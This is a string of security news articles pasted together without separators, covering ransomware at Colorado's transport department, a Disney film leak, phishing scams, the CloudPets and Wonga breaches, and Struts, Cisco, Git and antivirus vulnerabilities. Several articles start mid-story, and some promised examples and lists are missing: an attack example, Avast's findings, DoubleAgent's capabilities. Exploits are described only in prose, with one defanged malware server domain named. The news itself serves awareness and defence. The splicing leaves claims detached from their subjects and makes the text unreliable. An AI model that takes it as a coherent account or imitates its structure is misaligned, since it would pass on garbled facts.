“No payments have been made or will be made. We are still investigating to see whether or not files were damaged or recovered,” she said in an email Thursday.
On Wednesday morning, CDOT shut down more than 2,000 employee computers while security officials investigated the attack. The malicious code was a variant of ransomware known as SamSam, Simmons said. McAfee, the security software used by CDOT computers, provided a software patch on Wednesday to stop the execution of the ransomware.
“This ransomware virus was a variant and the state worked with its antivirus software provider to implement a fix today. The state has robust backup and security tools and has no intention of paying ransomware. Teams will continue to monitor the situation closely and will be working into the night,” said  David McCurdy, chief technology officer, Governor’s Office of Information Technology, in a statement on Wednesday.
He added: “OIT, FBI and other security agencies are working together to determine a root cause analysis.”
SamSam last showed up in January after targeting the healthcare industry. It encrypted files and renamed them “I’m sorry,” according to a report with security firm TrendMicro. One hospital, Hancock Health in Indiana, paid $55,000 to get its files back. TrendMicro said the attack wasn’t due to an employee opening an infected email, but hackers gained access remotely using a vendor’s user name and password.
“No one is back online. What we’re doing is working offline. All our critical services are still online — cameras, variable message boards, CoTrip, alerts on traffic. They are running on separate systems,” Ford said. “The message I’m sharing (with employees) is CDOT operated for a long time without computers so we’ll use pen and paper.”
There’s only one Mac computer in the office and it wasn’t turned on, Ford said, because “We’re not messing around today.”

Files claiming to be the new Pirates of the Caribbean movie have leaked online after Disney refused to meet hackers' demands.
On 17 May, Softpedia's Gabriela Vatu reported that two copies of Pirates of the Caribbean: Dead Men Tell No Tales had appeared on the popular (and somewhat appropriate) BitTorrent site The Pirate Bay.
""According to the information unearthed thus far, the hackers managed to get access to the systems of Larson Studios in Hollywood, a company that handles additional dialogue recorded for movies. It seems that the copies they've managed to get their hands on are in various stages of production and not exactly what you'd expect from a full cinema-ready release.""
News of the extortion attempt first appeared in The Hollywood Reporter on 15 May when Bob Iger, CEO at Walt Disney, revealed the hackers had demanded that Disney pay a ""huge sum"" in Bitcoins to prevent them from leaking a then-undisclosed movie online.
At the time, the attackers said they would release the film incrementally to netizens, first publishing clips lasting only a few minutes and slowly building up to 20-minute segments. Iger said Disney decided to not pay the attackers and was working with federal law enforcement to investigate the theft of one of its productions.
It's unclear who exactly perpetrated the leak - if indeed the files really are of the movie. Even so, a potential candidate is The Dark Overlord, a group of hackers who released the fifth season of Orange Is the New Black after Netflix refused to meet its ransom demands back in April 2017.
Around that time, the hacking gang, which has also extorted non-film entities in the past, tweeted out that it had stolen content from a number of other media companies. It did not name Walt Disney by name, though it did point to FOX, ABC, and others.
Who is next on the list? FOX, IFC, NAT GEO, and ABC. Oh, what fun we're all going to have. We're not playing any games anymore.
While Disney and Netflix continue to work with the FBI in tracking down The Dark Overlord, someone has already removed the two copies of what claimed to be the Pirates of the Caribbean film from The Pirate Bay. The hackers could release the movies again. Or they might be focusing on their next target.
While movie-goers might celebrate a leak of the movie, media companies like Walt Disney don't want viewers gaining early access to their content. That's why organizations should take the opportunity to conduct some security awareness training with their employees. This effort should include phishing simulations and reviewing the security readiness of companies along their supply chains.
Article updated 19 May 2017. None of the files made available as downloadable torrents have been confirmed to contain footage of the movie.

According to the Graham Cluley, hackers are conducting phishing attacks on gamers using two types of emails to steal their login credentials.
Hackers are sending emails to World of Warcraft players making them believe that they have won a prize followed by a link to claim it by putting their Blizzard account credentials.
The items used in the email are “Battlepaw” an in-game pet, and a flying mount called “Mystic Runesaber”.
Both these items are legitimate and can be bought in the game, which makes these emails more believable, but of course, it’s all just a lie.
Once you click the email, a new window will appear asking you to enter the login details of your blizzard account, and if you do that, the hacker will receive your information, which can either be sold or used personally.
“You are receiving this e-mail because your friend has purchased World of Warcraft In-Game Pet: Brightpaw for you as a gift!
This would have been a perfect scam if not for the two obvious flaws in the email.
First one is the suspicious looking question mark after Battle dot net, and the second one is named Blizzard Entertainment wrote at the end of the email.
Like all the other phishing scams, this one also relies on the poor judgment of the recipients and to make sure that you do not fall into this trap you must be very careful when you receive an email from an unknown sender.

Phishing is one of the most devious scams for filching your personal information, but experts say it is possible to avoid them if you know what you're looking for.
At its essence, phishing is the act of pretending to be someone or something you trust in order to trick you into entering sensitive data like your user name and password. The goal -- of course -- is to take your money.
Some of the most common phishing scams are bogus emails purportedly from trustworthy institutions like the U.S.Internal Revenue Service or major banks. The more sophisticated scams are crafted to look very much like a legitimate message from a site you do business with.
“Many popular phishing scams purport to be from shipping companies, e-commerce companies, social networking websites, financial institutions, tax-preparation companies and some of the world’s most notable companies,” said Norton by Symantec senior security response manager Satnam Narang via email.
One of the worst cases on record was an aircraft parts CEO who was tricked into handing over more than $55 million – which shows that phishing scams can dupe even smart people.
Fox News asked Symantec about the top phishing scams and how to avoid them.
1. Your account has been or will be locked, disabled or suspended.
""Scare tactics are a common theme when it comes to phishing scams,"" said Narang. ""Claiming a users’ account has been or will be locked or disabled is a call to action to the user to entice them to provide their login credentials.""
2. Irregular/fraudulent activity detected or your account requires a ""security"" update.
""Extending off of #1, scammers will also claim irregular or fraudulent activity has been detected on your account or that your account has been subjected to a compulsory 'security update' and you need to login to enable this security update,"" Narang said.
3. You’ve received a secure or important message.
""This type of phishing scam is often associated with financial institutions, but we have also seen some claiming to be from a popular e-commerce website,"" said Narang. ""Because financial institutions don’t send customer details in emails, the premise is that users will be more inclined to click on a link or open an attachment if it claims to be a secure or important message.""
4. Tax-themed phishing scams.
""Each year, tax-themed phishing scams crop up before tax-time in the U.S. and other countries,"" Narang added. ""These tax-related themes can vary from updating your filing information, your eligibility to receive a tax refund or warnings that you owe money. One thing that’s for sure is that the IRS doesn’t communicate via email or text message, they still send snail mail.""
5. Attachment-based phishing with a variety of themes.
""Another trend we have observed in recent years is that scammers are using the lures mentioned above, but instead of providing a link to an external website, they are attaching an HTML page and asking users to open this 'secure page' that requests login credentials and financial information,"" according to Narang.
Avast, which also develop antivirus software and internet security services, offered advice on what to look for.
Ransomware, which encrypts data (i.e., makes it inaccessible to the user), tries to tap into the same fears that phishing does. The hope that the “attacked person will panic, and pay the ransom,” Jonathan Penn, Director of Strategy at Avast, told Fox News.

In this campaign, hackers are distributing the malware through 2 files namely “NDA-ranked-8th-toughest-College-in-the-world-to-get-into.xls” and “NIA-selection-order-.xls” respectively.
These files are being circulated via WhatsApp in the form of authentic word files obtaining sensitive information from users which include online banking credentials, PIN codes and similar details.
According to IBTimes, Android users in India are the key targets of this new WhatsApp scam.
However, there isn’t any particular operating system that is being cited as the most affected one.
It is worth noting that these sorts of malware campaigns are usually designed to work on Google’s operating system instead of the iOS.
The reason why Indian android OS users are frequently being targeted by hackers in such campaigns is that Indian market is very popular for low-cost, cheap Android smartphones that run on older versions of the android OS.
Hackers are attacking two key organizations in India to compel users to click on the word documents attached in the malicious WhatsApp message.
This message has names of two major organizations of India namely National Defense Academy/NDA and National Investigation Academy/NIA.
These files are in Excel format mainly but versions of these files in Word and PDF formats have also been identified.
Authorities in India have already issued security alerts to the concerned authorities since it is being speculated that this new campaign attacks law enforcement authorities and military personnel in the majority.
“It has been analyzed that the men and women in defense, paramilitary and police forces could be the target groups,” believe security officials in India.
Israeli Tech firm claims its new CatchApp can hack any WhatsApp account
According to the Economic Times, the NIA and NDA are very popular organizations in India as well as abroad; there is a high level of curiosity about the way these organizations function among masses, which is why people are so interested in opening the infected attachments on WhatsApp.
At the moment it isn’t clear what else this malware performs when the files are opened and if WhatsApp has taken any action in this regard to prevent users from getting affected.

The Colorado Department of Transportation (DOT) has shut down over 2,000 computers after some systems got infected with the SamSam ransomware on Wednesday, February 21.
The agency's IT staff is working with its antivirus provider McAfee to remediate affected workstations and safeguard other endpoints before before reintroducing PCs into its network. 
DOT officials told local press [1, 2] that crucial systems were not affected, such as those managing road surveillance cameras, traffic alerts, message boards, and others. The agency's Twitter feed continued to show traffic alerts after the agency shut down much of its employees' IT network.

Colorado DOT will not pay the ransom
In a rare sign of transparency, officials revealed the name of the ransomware —SamSam. This is the same ransomware strain that infected hospitals, city councils, and ICS firms in January.
The hackers made over $300,000 from those attacks. One of the victims, an Indiana hospital agreed to pay a $55,000 ransom demand despite having backups. Hospital officials said it was easier and faster to pay the ransom than restore all its computers' data from backups.
DOT officials said they don't intend to follow suit by paying the ransom demand and they will restore from backups. 

SamSam ransomware making a comeback
The SamSam ransomware is a ransomware strain that's been deployed by a single group. Infection occurs after attackers gain access to a company's internal networks by brute-forcing RDP connections.
Attackers then try to gain access to as many computers on the same network as possible, on which they manually run the SamSam ransomware to encrypt files.
In the recent campaigns, SamSam operators usually asked for a 1 Bitcoin ransom and left a message of ""I'm sorry"" on victims' computers.
The SamSam group had been previously active in the winter of 2016 but have come back with new attacks. These new attacks have been detailed in reports published by Bleeping Computer, Secureworks, and Cisco Talos.

The toys -- which can receive and send voice messages from children and parents -- have been involved in a data breach dealing with more than 800,000 user accounts.
The breach, which grabbed headlines on Monday, is drawing concerns from security researchers because it may have given hackers access to voice recordings from the toy's customers.
But the company behind the products, Spiral Toys, is denying that any customers were hacked.
Absolutely not,"" said Mark Meyers, CEO of the company.
Security researcher Troy Hunt, who tracks data breaches, brought the incident to light on Monday.
Hackers appear to have accessed an exposed CloudPets' database, which contained email addresses and hashed passwords, and they even sought to ransom the information back in January, he said in a blog post.
The incident underscores the danger with connected devices, including toys, and how data passing through them can be exposed, he added.
In the case of CloudPets, the brand allegedly made the mistake of storing the customer information in a publicly exposed online MongoDB database that required no authentication to access.
That allowed anyone, including hackers, to view and steal the data.
On the plus side, the passwords exposed in the breach are hashed with the bcrypt algorithm, making them difficult to crack.
Unfortunately, CloudPets placed no requirement on password strength, meaning that even a single character such as letter ""a"" was acceptable, according to Hunt, who was given a copy of the stolen data last week.
As a result, Hunt was able to decipher a large number of the passwords, by simply checking them against common terms such as qwerty, 123456, and cloudpets.
""Anyone with the data could crack a large number of passwords, log on to accounts and pull down the voice recordings,"" Hunt said in his blog post.
Security researcher Victor Gevers from the GDI Foundation said he also discovered the exposed database from CloudPets and tried to contact the toy maker in late December.
However, both Gevers and Hunt said the company never responded to their repeated warnings.
On Monday, California-based Spiral Toys, which operates the CloudPets brand, claimed the company never received the warnings.
""The headlines that say 2 million messages were leaked on the internet are completely false,"" Meyers said.
His company only became aware of the issue after a reporter from Vice Media contacted them last week.
""We looked at it and thought it was a very minimal issue,"" he said.
A malicious actor would only be able to access a customer's voice recording if they managed to guess the password, he said.
""We have to find a balance,"" Meyers said, when he addressed the toy maker's lack of password strength requirements.
He also said that Spiral Toys had outsourced its server management to a third-party vendor.
In January, the company implemented changes MongoDB requested to increase the server's security.
Spiral Toys hasn’t been the only company targeted.
In recent months, several hacking groups have been attacking thousands of publicly exposed MongoDB databases.
They’ve done so by erasing the data, and then saying they can restore it, but only if victims pay a ransom fee.
In the CloudPets incident, different hackers appear to have deleted the original databases, but left ransom notes on the exposed systems, Hunt said.
Although the CloudPets’ databases are no longer publicly accessible, it appears that the toy maker hasn’t notified customers about the breach, Hunt said.
The danger is that hackers might be using the stolen information to break into customer accounts registered with the toys.
But Meyers said the company found no evidence that any hackers broke into customer accounts.
To protect its users, the company is planning on a password reset for all users.
""Maybe our solution is to put more complex passwords,"" he said.

All those affected are being offered one year of free access to identity theft protection services from CSID.
BBC News notes that security researcher Chris Vickery uncovered vulnerabilities in Topps databases back in December of 2015 and June of 2016, but he wasn't able to get a response from the company by email.
It's not clear whether the credit card breach was related to the flaws Vickery found.
A recent Thales e-Security survey of 1,016 U.S. adults found that fully 88 percent of respondents said they would stop using digital payments if they fell victim to cybercrime as a result of a data breach.
Seventy percent said they would stop using digital payments if money was stolen from a linked bank account, 68 percent said they would do so if unauthorized charges appeared on a linked credit card account, and 59 percent said they would do so if their user name and password were stolen.
""The mobile payments industry needs to take note that their future success is based on trust,"" Thales e-Security director of payment strategy Jose Diaz said in a statement.
""And that trust can easily fail if they do not provide the strong protection of their infrastructure, transactions and data that customers expect.""
A separate Thales survey of 1,000 adults in the U.S. and the U.K. recently found that 55 percent of respondents would switch to only using cash at a retailer if they learned that credit card data had been stolen from its systems -- and 20 percent would stop shopping at that retailer altogether.

 If any students or teachers logged on to social media or opened their email inbox using certain computers at Carleton University in Canada's capital city of Ottawa recently, their every keystroke was likely recorded by an unknown hacker.
According to an emailed statement, the university discovered USB sticks loaded with what's known as ""keylogger"" software on computers in six classrooms during a routine inspection.
Keylogger software intercepts the commands a keyboard sends to your computer, logging the keystrokes that make up your passwords and messages.
A university spokesperson wouldn't clarify when the discovery was made.
According to the university, the USB keyloggers in question would have required someone to physically pick them up in order to access any data they recorded, and there's no evidence that someone ever came by.
""These computers are used solely for instructional purposes in classrooms and do not store any university, personal or confidential information,"" an emailed statement from Carleton University stated.
""We have no evidence that any information was retrieved from these devices or that any university data were compromised.""
Even so, it's a concerning state of affairs for students and teachers, who may use instructional computers for personal correspondence or professional obligations at the school.
Carleton was the victim of a ransomware attack in November of last year, which locked down dozens of computers that would only unlock if the university paid a ransom in bitcoin.
""I don't think at this point there's been any formal link between these two events,"" said Steven Reid, a university spokesperson, in an interview.
""An investigation is ongoing into the keylogger incident, but nothing specific related to anything in the past.""
Even though there's no evidence that the hacker got a chance to come collect the goods, it's probably a great idea for any Carleton students to change their passwords right about now.

Cisco's Talos says they've observed active attacks against a Zero-Day vulnerability in Apache's Struts, a popular Java application framework.
Cisco started investigating the vulnerability shortly after it was disclosed, and found a number of active attacks.
In an advisory issued on Monday, Apache says the problem with Struts exists within the Jakarta Multipart parser.
""It is possible to perform a RCE attack with a malicious Content-Type value.
If the Content-Type value isn't valid an exception is thrown which is then used to display an error message to a user,"" the warning explained.
""If you are using Jakarta based file upload Multipart parser, upgrade to Apache Struts version 2.3.32 or 2.5.10.1.
You can also switch to a different implementation of the Multipart parser.""
The alternative is the Pell parser plugin, which uses Jason Pell's multipart parser instead of the Common-FileUpload library, Apache explains.
In addition, administrators concerned about the issue could just apply the proper updates, which are currently available.
In a blog post, Cisco said they discovered a number of attacks that seem to be leveraging a publicly released proof-of-concept to run various commands.
Such commands include simple ones ('whoami') as well as more sophisticated ones, including pulling down malicious ELF executable and running it.
An example of one attack, which attempts to copy the file to a harmless directory, ensure the executable runs, and that the firewall is disabled is boot-up, is below:
Both Cisco and Apache urge administrators to take action, either by patching or ensuring their systems are not vulnerable.
This isn't the first time the Struts platform has come under attack.
In 2013, Chinese hackers were using an automated tool to exploit known vulnerabilities in order to install a backdoor.

CIsco has issued a critical patch of a patch for a Cisco Prime License Manager SQL fix.
Cisco this week said it patched a “critical” patch for its Prime License Manager (PLM) software that would let attackers execute random SQL queries.
The Cisco Prime License Manager offers enterprise-wide management of user-based licensing, including license fulfillment.
Released in November, the first version of the Prime License Manager patch caused its own “functional” problems that Cisco was then forced to fix. That patch, called ciscocm.CSCvk30822_v1.0.k3.cop.sgn addressed the SQL vulnerability but caused backup, upgrade and restore problems, and should no longer be used Cisco said.
Cisco wrote that “customers who have previously installed the ciscocm.CSCvk30822_v1.0.k3.cop.sgn patch should upgrade to the ciscocm.CSCvk30822_v2.0.k3.cop.sgn patch to remediate the functional issues. Installing the v2.0 patch will first rollback the v1.0 patch and then install the v2.0 patch.”
As for the vulnerability that started this process, Cisco says it “is due to a lack of proper validation of user-supplied input in SQL queries. An attacker could exploit this vulnerability by sending crafted HTTP POST requests that contain malicious SQL statements to an affected application. A successful exploit could allow the attacker to modify and delete arbitrary data in the PLM database or gain shell access with the privileges of the postgres [SQL] user.”
The vulnerability impacts Cisco Prime License Manager Releases 11.0.1 and later.

Cisco has resolved a set of critical vulnerabilities in Policy Suite which permit attackers to cause havoc in the software's databases.
This week, the tech giant released a security advisory detailing four vulnerabilities which could place enterprise users at risk of information leaks, account compromise, database tampering, and more.
The first vulnerability, CVE-2018-0374, has earned a CVSS base score of 9.8. Described as an unauthenticated bypass bug, the security flaw ""could allow an unauthenticated, remote attacker to connect directly to the Policy Builder database,"" according to Cisco.
The bug has been caused by a simple lack of authentication and as there is no requirement for identity verification, Policy Builder databases can be accessed and tampering with without limitation.
Cisco Policy Suite releases prior to 18.2.0 are affected.
The second vulnerability, CVE-2018-0375, is a default password error. The CVSS 9.8 bug is present in the Cluster Manager of Cisco Policy Suite and could allow an unauthenticated, remote attacker to log in to a vulnerable system using a root account.
The serious security problem has emerged due to the use of undocumented, static user credentials for root accounts. If a hacker has knowledge of these credentials, they can become a root user and are able to execute arbitrary commands.
Versions of the software prior to 18.2.0 are vulnerable to exploit.
The third bug, CVE-2018-0376, is another unauthenticated access problem and is also caused by a lack of authentication measures.
""A successful exploit could allow the attacker to make changes to existing repositories and create new repositories,"" Cisco says.
Cisco Policy Suite versions prior to 18.2.0 are affected.
The fourth security flaw, CVE-2018-0377, affects the Open Systems Gateway initiative (OSGi) interface of Cisco Policy Suite.
There is a lack of authentication within the OSGi interface which permits attackers to circumvent security processes and directly connect to the interface, access any files contained within they wish, and modify any content which is accessible through the process.
This vulnerability impacts Policy Suite versions prior to 18.1.0.
There are no workarounds to circumvent these vulnerabilities. However, patches have been issued to address them and Cisco says that no reports have been received which indicate the bugs are being exploited in the wild.
In addition, Cisco has revealed seven now-patched bugs affecting SD-WAN solutions. The vulnerabilities included command injection security flaws, a remote code execution bug, and arbitrary file overwrite issues.

A new phishing campaign is using a fake iTunes receipt for movie purchases to compromise Apple users' sensitive information.
Fortinet researchers first spotted the phishing campaign over the weekend of 17 February.
The attack begins when an Apple user receives a receipt that appears to have come from iTunes.
In actuality, an email address based in Norway sent the message.
The receipt lists purchases for a series of movies.
These films (which include ""Allied"", ""Arrival"", and ""Jack Reacher: Never Go Back"") debuted in theaters recently, which makes the ruse relevant and consequently more believable.
This email isn't the first time phishers (or smishers, for that matter) have targeted Apple users.
Users in the United Kingdom, Australia, and the United States have witnessed similar attacks over the past few years.
This particular campaign targets Canadian users and seems to have improved upon earlier iterations of the scam.
Of course, most users who receive the receipt will wonder why they've been charged so much money for something they haven't purchased.
Their attention will subsequently go to the link at the bottom of the email that claims they can obtain a full refund.
But clicking on the link doesn't help them in the slightest.
As explained by Fortinet's researchers:
""At the bottom of the receipt, there’s a link to request a “full refund” in case of an unauthorized transaction.
Apple has no need for a user's Social insurance number, which Canadians need to work for or to access government services, or their mother's maiden name.
But the phishers want their targets to overlook that fact and enter their details.
Indeed, doing so would help the attackers assume control of their victim's credit card and other financial information.
This campaign, like so many others, demonstrates the importance of carefully reviewing suspicious emails.
Users should look at the sending email address to see if it's legitimate.
If they come across an invoice or receipt for a credit card purchase, they should check their account history for such a transaction.
If they don't find anything, that means scammers are just trying to scare them into handing over their payment card details.
Additionally, users might consider setting up transaction notifications on their payment cards.
That way, if they haven't received an alert of a transaction, they'll immediately know that an invoice such as the one above is a fake.

SCAMMERS are using fake websites to lure in Cyber Monday and Christmas shoppers and take their money.
Be wary of ""too good to be true"" offers on Fingerlings toys, iPhones and fashion as they're the most common items sold by fraudsters, according to the City of London Police.
With shoppers set to spend £2.96billion by the end of Cyber Monday, fraud experts have warned that scammers will tempt shoppers with suspiciously good deals so they buy their counterfeit items and hand over their card details.
They'll also set up fake websites that look like genuine retailers to trick people into giving away their data and payment details,  according to a new report by Action Fraud and the City of London Police.
Phishing emails containing tempting deals which entice shoppers to click on links to fake websites are also on the rise on Cyber Monday and over the Christmas period, the report said.
Scammers are using social media websites such as Facebook, re-selling websites such as Gumtree and online auction websites such as eBay to target Christmas shoppers, experts revealed.
Mobile phones - particularly Apple iPhones - are the most common item that people try to buy from fraudsters, according to the report.
Seventy-four per cent of all mobiles bought from fraudsters were iPhones, the study said.
Electrical and household items, computers, fashion and accessories are also commonly sold to fraud victims, including Apple MacBooks, Ugg boots and Fingerlings toys - so be wary of ""too good to be true"" offers for these items.
Women aged between 20 and 29 are the most likely to be caught out by scammers, according to the report, with 30 per cent of fraud reports coming from young women.
But the police have warned that everyone should stay on their guard as anyone can fall victim to Christmas shopping fraudsters.
More than 15,000 shoppers lost a total of £11million to scammers over the Christmas period last year.
Detective Chief Superintendent Pete O’Doherty, of the City of London Police, said: “Unfortunately, at what is an expensive time of year for many, the internet has provided fraudsters with a platform to lure people in with the promise of cheap deals.
He added: “To stop fraudsters in their tracks, be cautious of where and from whom you’re buying, especially if it is technology at a reduced price.""
Tony Neate, CEO of Get Safe Online, a free fraud awareness website, said: “It can be easy to rush into making a quick purchase online to secure a must have gift or bargain without taking the time to check that everything is as it seems.
“But taking a couple of minutes to familiarise yourself with a few simple online safety tips can be the difference between getting all your shopping done in time and becoming a victim of online fraud.""

Half a million smart devices including webcams and baby monitors in the city are currently vulnerable to cyber attack.
BARCELONA, Spain--(BUSINESS WIRE)--Avast, the leader in digital security products for consumers and businesses, today reveals the findings from its latest research experiment into smart devices, including public and private webcam vulnerabilities in Spain, and, specifically, in Barcelona.
Avast identified more than 22,000 webcams and baby monitors in the city that are vulnerable to attack, which means that cybercriminals could livestream the videos directly to the internet.
The findings identified more than 493,000 smart devices in Barcelona and 5.3 million in Spain overall – including smart kettles, coffee machines, garage doors, fridges, thermostats and other IP-connected devices – that are connected to the internet and vulnerable to attacks.
As webcams and other devices are vulnerable, there are a range of security, legal and privacy concerns to be addressed.
Snoopers could easily access and watch Mobile World Congress visitors and Barcelona residents in private and public spaces, and stream the video directly to the internet, or turn the device into a bot.
When a device is infected, it can also be used to infect other devices, to add them to a botnet, or to take control over them and do harm to their owner.
This includes kitchen and other household devices, to which cybercriminals can give remote orders, for example, to heat up water in a kettle.
Smart device manufacturers also collect and store private user data, including behavioral data, contact information, and credit card details, which poses an additional risk if intercepted by cybercriminals.
And while the problem is in no way confined to Barcelona, Spain, or indeed to webcams, it is particularly challenging for the city as it is hosting thousands of mobile and technology industry executives at Mobile World Congress 2017 this week.
In the experiment, Avast found:Conducted in partnership with IoT search engine specialists Shodan.io, the experiment proves just how easy it is for anyone - including cybercriminals - to scan IP addresses and ports over the Internet and classify what device is on each IP address.
And, with a little extra effort and know-how, hackers can also find out the type of device (webcam, printer, smart kettle, fridge and so on), brand, model and the version of software it is running.
“With databases of commonly known device vulnerabilities publicly available, it doesn’t take a vast amount of effort and knowledge for cybercriminals to connect the dots and find out which devices are vulnerable,” comments Vince Steckler, CEO at Avast.
“And even if the devices are password protected, hackers often gain access by trying out the most common user names and passwords until they crack it”.
Avast’s latest research experiment highlights a serious and growing problem which, unless addressed, will only worsen in line with the increasing number of devices connected to the Internet.
Vince Steckler, Avast, continues: “If webcams are set to livestream for example, hackers or anyone can connect, making it easy for cybercriminals to spy on innocent Mobile World Congress trade show visitors, or oblivious school pupils, workers or citizens nearby.
In the future, we could also see cases where cybercriminals harvest personal data, including credit card information from unsuspected IoT users”.
To be aware of vulnerabilities and secure all connected devices against unwanted attacks, users need to contribute to making the online world a safer place by keeping software updated and choosing strong, complex passwords.

The mobile phone company Three has experienced a fresh data breach after some customers logging into their accounts were presented with the names, addresses, phone numbers and call histories of strangers.
Three said it was investigating a technical issue with its systems and urged those affected to contact its customer service department.
One customer, Andy Fidler, told the Guardian he was presented with the data usage and full call and text history of another named customer when he logged in on Sunday night.
Another, Mark Thompson, said on Facebook he received a call from a complete stranger who said she had logged on to her account and was shown his details.
Thompson said it was a “shocking breach of data privacy”.
He wrote on Three UK’s Facebook page: “Care to explain just how my details have been shared, how many people have had access to my personal information, for how long, and how many of your other customers have had their details leaked by yourselves to other members of the public as well?”
Other customers also wanted to know why they were being presented with other people’s information when they logged in.
Three UK, which is owned by the telecoms giant Hutchinson and has 9 million customers in Britain, said it was investigating.
“We are aware of a small number of customers who may have been able to view the mobile account details of other Three users using My3,” a spokesman said.
“No financial details were viewable during this time and we are investigating the matter”.
The Information Commissioner’s Office said it “will be looking into this potential incident involving Three”.
A spokeswoman for the regulator said: “Data protection law requires organisations to keep any personal information they hold secure.
It’s our job to act on behalf of consumers to see whether that’s happened and take appropriate action if it has not”.
The problem comes four months after three men were arrested after fraudsters accessed personal data of thousands of Three customers, including names and addresses, by using authorised logins to its database of customers eligible for an upgraded handset.
Customer information from more than 133,000 users was compromised in the incident.

The Git community has disclosed a security vulnerability affecting the clone and submodule commands that could enable remote code execution when vulnerable machines access malicious repositories. The vulnerability, which has been assigned CVE–2018–17456 by Mitre, has been fixed in Git 2.19.1.
To trigger the vulnerability, a malicious repository could forge a .gitmodules containing an URL starting with a dash. This would affect both git clone --recurse-submodules and git submodule update --recursive in that they would recursively pass the URL starting with a dash to a git clone or git submodule subprocess that would interpret the URL as a command option. This could lead to executing an arbitrary command on the local machine. This vulnerability is similar to CVE–2017–1000117, which also enabled an option-injection attack by forging ssh URLs starting with a dash that would be interpreted as an option by the ssh subprocess executed by git. No exploits are known at the moment.
    We were also able to use the time to scan all repositories on GitHub for evidence of the attack being used in the wild.
As shown in the PR fixing the vulnerability, submitted by @joernchen, the fix is quite trivial in itself. Yet, this discovery provided the opportunity for an overall audit of .gitmodules, which led to implementing stricter checks on both paths and URLs found inside of it.
As mentioned, the fix for this vulnerability is included in Git 2.19.1. Additionally, it has been backported to versions 2.14.5, 2.15.3, 2.16.5, 2.17.2, and 2.18.1. Since git is integrated in GitHub projects such as GitHub Desktop and Atom, those have been patched as well, so you will be better off upgrading them as soon as possible.

Payday lender Wonga appears to be the latest big-name brand to suffer a damaging data breach, after admitting over the weekend “there may have been illegal and unauthorized access” to customers’ personal details.
The firm was tight-lipped on how many customers might have been affected, although reports suggest it is in the region of 270,000, most of whom are based in the UK.
The short-term loans company, which charges customers over 1200% APR, was also short on details and hedged its bets somewhat as to the cause.
The firm claimed in an FAQ on the incident that it is still trying to establish the details and contact those affected.
What we do know is that customer names, e-mail addresses, home addresses and phone numbers may have been compromised, along with the last four digits of their card number and/or bank account number and sort code.
It added:
“We do not believe your Wonga account password was compromised and believe your account should be secure, however if you are concerned you should change your account password.
We also recommend that you look out for any unusual activity across any bank accounts and online portals”.
Wonga also advised customers to be on the lookout for follow-up scams, both online and over the phone.
The kind of information that appears to have been compromised would certainly provide seasoned fraudsters with enough to socially engineer targets into divulging more details such as their full card numbers.
This is just the latest in a long line of breaches at big-name companies.
Data from over 130,000 customers of network operator Three was illegally obtained by fraudsters back in November.
The impact to brand and reputation can be a serious blow to breached organizations.
TalkTalk is said to have lost 100,000 customers and £60m as a result of a breach at the ISP.
André Stewart, EMEA vice-president at Netskope, argued that coming European privacy laws will force organizations to be more accountable for their data practices.
“As a result, companies will be forced to take active measures to mitigate any threats to personal privacy, whether that data is stored on-premises or in the cloud.
Any companies falling short of these standards could face hefty fines,” he explained.
“Alongside demonstrating that they have coached employees on the GDPR and secure data handling, employers will also need to provide staff with the tools to do their jobs securely without sacrificing ease and convenience”.
Kevin Cunningham, president of SailPoint, added that staff from the board down need to be well-drilled in order to help protect sensitive customer information.
“In today’s market, it’s a matter of when, not if, a data breach will happen.
So the most important factors are prevention, education, and rapid response,” he argued.
“When a breach does happen, it’s important to quickly find out how and why it occurred, assess the damage and required response, and put IT controls in place to address future attacks”.

Security researchers from computer and network security outfit Cybellum have revealed a new zero-day code injection and persistence technique that can be used by attackers to take over applications and entire Windows machines.
They demonstrated the attack on antivirus solutions, and ultimately dubbed it DoubleAgent, as it turns the antivirus security agent into a malicious agent.
“DoubleAgent exploits a legitimate tool of Windows called ‘Microsoft Application Verifier’ which is a tool included in all versions of Microsoft Windows and is used as a runtime verification tool in order to discover and fix bugs in applications,” the company explained.
“Our researchers discovered an undocumented ability of Application Verifier that gives an attacker the ability to replace the standard verifier with his own custom verifier.
An attacker can use this ability in order to inject a custom verifier into any application.
Once the custom verifier has been injected, the attacker now has full control over the application”.
In fact, the attack can be used to compromise all kinds of applications, but the researchers chose to focus on antivirus solutions since this type of software is generally considered to be trusted.
“By using DoubleAgent, the attacker can take full control over the antivirus and do as he wish without the fear of being caught or blocked,” they noted.
This includes:
Cybellum researchers demonstrated a DoubleAgent code injection against Symantec Norton antivirus, and offered PoC exploit code on GitHub.
More technical details about the DoubleAgent technique can be found here.
The researchers have notified major antivirus vendors of their findings, and some of them (Malwarebytes, AVG) have already issued a patch for the vulnerability.
Among the still vulnerable antivirus apps are those by Avast, BitDefender, ESET, Kaspersky, and F-Secure.
“Microsoft has provided a new design concept for antivirus vendors called Protected Processes.
The new concept is specially designed for antivirus services.
Antivirus processes can be created as ‘Protected Processes’ and the protected process infrastructure only allows trusted, signed code to load and has built-in defense against code injection attacks,” the researchers explained.
“This means that even if an attacker found a new zero-day technique for injecting code, it could not be used against the antivirus as its code is not signed.
Currently no antivirus (except Windows Defender) has implemented this design, even though Microsoft made this design available more than 3 years ago”.
The vulnerability that allows the DoubleAgent attack works on all Microsoft Windows versions and architectures.
The attack technique can be used to take over any application, and even the OS.
“We need to make more efforts to detect and prevent these attacks, and stop blindly trusting traditional security solutions,” the researchers noted.
We implemented the fix at the time of reporting and therefore can confirm that both the Avast and AVG 2017 products, launched earlier this year, are not vulnerable.
It is important to note that the exploit requires administrator privileges to conduct the attack which is difficult for hackers to achieve.

A spam campaign targeting German users has increased its chances of successfully tricking users into installing malware, by embedding several pieces of the victim's personal information into its poisoned email messages.
The campaign, which has been active since at least January 2017, begins when a user receives an email written entirely in German.
Its message informs the recipient they've attempted to pay for something online but that the transaction did not complete successfully
The user must re-submit payment, the email demands, otherwise they could be penalized by a collection agency or even law enforcement.
Sample of spam message seen targeting German users.
Most of us know better than to fall for this type of scam, and the attackers know it.
Which is why they've outfitted their attack emails with a technique that's designed to convince the recipient the notice is legitimate.
Andrew Brandt, director of threat research at Symantec, elaborates on this point in a blog post:
""The key detail of each message was the fact that the recipient’s full name, mailing address, and telephone number were embedded in the middle of the message.""
Brandt doesn't elaborate on how the attackers obtain users' personal information.
Technically, bad actors can use Google and other tools to easily find these details.
Seeing your personal information is enough to sway most users, so much so that a recipient would probably open the double-zipped attachment and thereby expose themselves to Nymaim.B.
For its command and control (C&C) server, this banking trojan uses afegesinge[dot]com.
At one point in time, 13 other malware executables communicated with it.
